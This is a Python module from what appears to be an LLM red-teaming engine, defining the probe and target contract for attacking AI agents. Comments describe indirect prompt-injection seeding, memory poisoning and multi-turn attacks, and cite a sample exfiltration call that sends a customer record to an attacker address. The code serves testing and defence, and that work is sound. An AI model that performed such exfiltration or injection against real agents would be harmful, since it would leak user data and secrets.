"""
The stable contract every target implements. The engine only ever sees `Probe`,
never a specific bot — that's what makes new targets drop-in.

A target may advertise capabilities so the engine can adapt / degrade gracefully:
  - "tool_visibility": send() can report tool_calls + observations (rich oracle).
                       Black-box HTTP bots omit this -> output-only detectors.
  - "seed": can plant attacker data for indirect-delivery scenarios.
"""
import glob
import os
from dataclasses import dataclass, field
from typing import Optional, List, Tuple


def payload(text):
    """Normalise a payload on its way to a target. Call this at EVERY send site.

    Edge whitespace is not free. Measured on portalagent, mistral-nemo, temperature 0,
    three trials: the identical request scored 0/3 with a trailing newline and 3/3 without
    it — GetProfile(1) versus GetProfile(2), a real authorization boundary decided by one
    invisible character. A YAML block scalar (`text: |`) always appends one, and 110 of the
    225 payloads in this repo's arsenal and objective files are written that way.

    So a run that does not normalise is not measuring the payload its author wrote, and the
    difference is large enough to flip a verdict. It lives here, next to the contract every
    target implements, because a rule that has to be remembered at five call sites will be
    missing from the sixth.
    """
    return (text or "").strip()


def _pair(entry):
    """One tool call as (name, argument), both strings. None when it names no tool.

    Dropped rather than kept as ("", ""): a call nobody can name is not evidence about a tool,
    and a detector counting it would be counting a parse failure as a finding. `targets_http`
    does the dialect-specific version of this — OpenAI nests the name inside `function`,
    Anthropic calls the argument `input` — and this is the floor underneath it, so an adapter
    that builds the list by hand cannot hand a detector something it cannot unpack.
    """
    if entry is None:
        return None
    if isinstance(entry, dict):
        inner = entry.get("function") if isinstance(entry.get("function"), dict) else entry
        name = inner.get("name") or entry.get("tool") or ""
        arg = inner.get("arguments", inner.get("args", inner.get("input", "")))
    elif isinstance(entry, str):
        name, arg = entry, ""
    elif isinstance(entry, (list, tuple)):
        if not entry:
            return None
        name = entry[0]
        rest = [x for x in entry[1:] if x not in (None, "")]
        arg = rest[0] if len(rest) == 1 else (" ".join(str(x) for x in rest) if rest else "")
    else:
        name, arg = entry, ""
    name = "" if name is None else (name if isinstance(name, str) else str(name))
    arg = "" if arg is None else (arg if isinstance(arg, str) else str(arg))
    return (name, arg) if name.strip() else None


@dataclass
class Probe:
    prompt: str
    output: str = ""
    tool_calls: List[Tuple[str, str]] = field(default_factory=list)   # [(tool, input)]
    observations: List[str] = field(default_factory=list)
    error: Optional[str] = None
    seconds: float = 0.0
    # per-turn breakdown of a chain (backward-compatible: empty for single sends).
    # Each entry: {"prompt": str, "output": str, "tool_calls": [...]}. Lets a detector
    # tell WHICH turn misbehaved — e.g. memory-poisoning fires on a benign LATER turn.
    turns: List[dict] = field(default_factory=list)
    # What each tool ACTUALLY received, as opposed to what the model wrote. On a
    # tool-calling agent these are the same thing; on a code agent they are not, and the
    # difference is the whole finding.
    #
    #     send_email(to="attacker@example.com", body=customer_record)
    #
    # That exfiltrated a customer record including an API key, and no detector could see
    # it, because the argument text is a VARIABLE NAME and the secret is bound to it at run
    # time. Pattern matching over source cannot follow data, and tightening the patterns
    # never will. Only the boundary knows what crossed it.
    #
    # So a target may report it: [(tool, resolved_arguments)], recorded by wrapping the
    # tools themselves. This is not an exotic ask of an operator — tool-call logging is
    # standard in every agent-observability setup, so in a real deployment it is something they
    # already have. When it is absent the oracle says so rather than reporting clean; see
    # `oracle.blind_spots`.
    resolved: List[Tuple[str, str]] = field(default_factory=list)

    def __post_init__(self):
        """The annotations above are a promise; this is what keeps it.

        A dataclass annotation converts nothing. `output: str` was true of exactly one adapter —
        `targets_http` calls `str(reply)` — while the others pass whatever their source handed
        them, and three read it straight out of an application's JSON where a number or a null
        is a perfectly ordinary answer. Fuzzed against every shape a Probe can hold, 55 of the
        63 detectors raise on a non-string `output`, and a detector that raises reports nothing,
        which is indistinguishable from a target that did nothing wrong.

        Coercing here rather than defending in 64 detectors: the assumption belongs to the
        contract, so the contract is where it should be true.

        `None` becomes `""` and not `"None"`. The four characters of that word are evidence
        nobody produced, and a canary detector matching inside it would be reading a bug.
        """
        for _f in ("prompt", "output", "error"):
            _v = getattr(self, _f)
            if _v is None:
                if _f != "error":            # `error=None` means there was no error
                    object.__setattr__(self, _f, "")
            elif isinstance(_v, (bytes, bytearray)):
                # Decoded, not repr'd. `str(b"hi")` is the four characters `b'hi'`, which
                # would put quote marks and a `b` into the evidence a detector reads.
                object.__setattr__(self, _f, bytes(_v).decode("utf-8", "replace"))
            elif not isinstance(_v, str):
                object.__setattr__(self, _f, str(_v))
        for _f in ("tool_calls", "observations", "turns", "resolved"):
            if getattr(self, _f) is None:
                object.__setattr__(self, _f, [])
        # `tool_calls: List[Tuple[str, str]]` is what sixteen detectors unpack, and it was true
        # of one adapter. The rest build the list from their own source, so a bare name, a
        # one-tuple or a None in the list reached detectors that had every right to expect a
        # pair — and an unpacking error is a detector reporting nothing, which reads as clean.
        for _f in ("tool_calls", "resolved"):
            object.__setattr__(self, _f, [_pair(_x) for _x in getattr(self, _f)
                                          if _pair(_x) is not None])
        # `turns` IS NOT NARROWED HERE, and the suite is why. Dropping non-dict entries made
        # every detector safe and broke `capitulation`, which deliberately reads BOTH shapes:
        # one dict per exchange, and a flat alternating list. Removing a supported input to
        # spare two consumers from checking their own is the wrong trade, so the two that
        # called `.get()` on whatever they were handed now check first.
        # Observations are read as text by every detector that touches them.
        object.__setattr__(self, "observations",
                           [_x if isinstance(_x, str) else ("" if _x is None else str(_x))
                            for _x in self.observations])
        try:
            self.seconds = float(self.seconds or 0)
        except (TypeError, ValueError):
            self.seconds = 0.0

    def silent(self):
        """Did anything at all come back? Nothing here is a measurement, whatever it scores.

        AN EMPTY REPLY IS NOT A CLEAN REPLY, and until 2026-08-28 it was counted as one. A
        third-party RAG app answered HTTP 200 with an empty body for fifty consecutive probes
        while the model behind it was down, its adapter recorded no error because there was no
        error, and the baseline reported `48 clean`. Every detector scored silence and found
        nothing, which is exactly what a defended target looks like.

        The sweep has the same shape one door along: a target that returns nothing gets DEFENDED
        on every attack in the arsenal, and a history diff then reports the whole file as fixed.
        `run_redteam` already refused a run where every trial ERRORED, for that precise reason.
        This is the same event arriving without an exception attached, so it belongs to the same
        rule rather than to a second one written next to it.

        Tool calls and turns count as an answer: an agent that called a tool and said nothing
        has told us a great deal.
        """
        return not ((self.output or "").strip() or self.tool_calls or self.turns
                    or self.observations)


class Target:
    name = "target"
    capabilities: set = set()

    def send(self, prompt: str) -> Probe:
        raise NotImplementedError

    def reset(self) -> None:
        """Fresh conversation/memory before each probe. Override if stateful."""

    def seed(self, payload: dict) -> None:
        """Plant attacker-controlled data for indirect delivery."""
        raise NotImplementedError(f"target '{self.name}' has no 'seed' capability")

    def unseed(self) -> None:
        """Remove planted data. Always called even if the probe errors."""

    def send_chain(self, prompts: list) -> Probe:
        """Multi-turn attack: run prompts in sequence with PERSISTENT memory,
        returning one Probe whose tool_calls/observations aggregate the whole
        conversation. Requires the 'chain' capability."""
        raise NotImplementedError(f"target '{self.name}' has no 'chain' capability")


def engine_version():
    """Which build of this engine produced an artifact. Cheap, cached, never fatal.

    A stored result is read as a statement about the current engine, and it is not: it is a
    statement about the engine that WROTE it. `tool_call_storm` held a place in the published
    "demonstrated" count on one probe holding eleven tool calls, and the eleven were each
    concrete call recorded twice — written by the adapter version that kept boundary records
    and raw calls in one list, before that was split into `probe.resolved`. Fixing the adapter
    did not fix the file it had already written: that stayed on disk and went on propping up
    the headline, because nothing about it said which engine it came from.

    So every result carries the commit that produced it, and a reader can say "this evidence
    predates the fix" instead of discovering it by hand a day later. Best-effort on purpose:
    a missing git, a tarball with no history, a detached checkout — none of those is a reason
    to fail a run, and "unknown" is a truthful answer that still distinguishes itself from a
    hash.
    """
    global _ENGINE_VERSION
    if _ENGINE_VERSION is not None:
        return _ENGINE_VERSION
    _ENGINE_VERSION = "unknown"
    try:
        import subprocess
        here = os.path.dirname(os.path.abspath(__file__))
        rev = subprocess.run(["git", "rev-parse", "--short", "HEAD"], cwd=here,
                             capture_output=True, text=True, timeout=5)
        if rev.returncode == 0 and rev.stdout.strip():
            _ENGINE_VERSION = rev.stdout.strip()
            dirty = subprocess.run(["git", "status", "--porcelain", "--", "."], cwd=here,
                                   capture_output=True, text=True, timeout=5)
            # An uncommitted engine is not the commit it claims to be, and a result written
            # from one is not reproducible from that hash. Say so rather than round down.
            if dirty.returncode == 0 and dirty.stdout.strip():
                _ENGINE_VERSION += "+dirty"
    except Exception:
        pass
    return _ENGINE_VERSION


_ENGINE_VERSION = None


def target_configs(directory=None):
    """Every real target config in a directory, sorted, temporaries excluded.

    ONE enumeration because there were eleven, and only one of them excluded the temporary
    configs the end-to-end suites write beside the real ones. The others' answers changed
    depending on whether a suite was running: a gate counted two extra oracle contexts and
    reported it as a documentation drift, and a full sweep would have run against a config
    that exists only to be unreachable.

    The suffix is the same one `build_generic.py` excludes for the arsenal, and it is the
    reason `test_end_to_end.py` puts its process id BEFORE `_tmp` rather than after.
    """
    directory = directory or os.path.dirname(os.path.abspath(__file__))
    found = sorted(p for p in glob.glob(os.path.join(directory, "targets_*.yaml"))
                   if not os.path.basename(p).endswith(("_tmp.yaml", ".tmp.yaml")))

    # AND THE ONES THAT DO NOT LIVE HERE, which is every config `qatration init` writes. This
    # enumeration is what `rejudge`, `coverage` and the report builders use to find the oracle
    # context for a set of results -- the canaries and markers that decide whether a stored
    # reply is a leak. Looking only in this directory meant that for anybody who is not this
    # repository, rejudge re-scored nothing and coverage scanned with an empty context, with
    # every canary detector inert. Both said so; neither could be pointed anywhere.
    #
    # Fixed here rather than as a flag per command, because a flag per command is a flag the
    # next command arrives without. Same shape as QATRATION_OUT: paths, separated by the
    # platform's path separator.
    #
    # A named path is used as named. The `_tmp` exclusion above exists because the end-to-end
    # suites write throwaway configs into THIS directory; somebody who spells out a path means
    # the file they spelled out.
    extra = os.environ.get("QATRATION_CONFIGS", "")
    for p in extra.split(os.pathsep):
        p = p.strip()
        if p and p not in found:
            if not os.path.isfile(p):
                raise SystemExit(f"QATRATION_CONFIGS names {p!r}, which is not a file. "
                                 f"Nothing was read, rather than reading less than asked.")
            found.append(p)
    return found
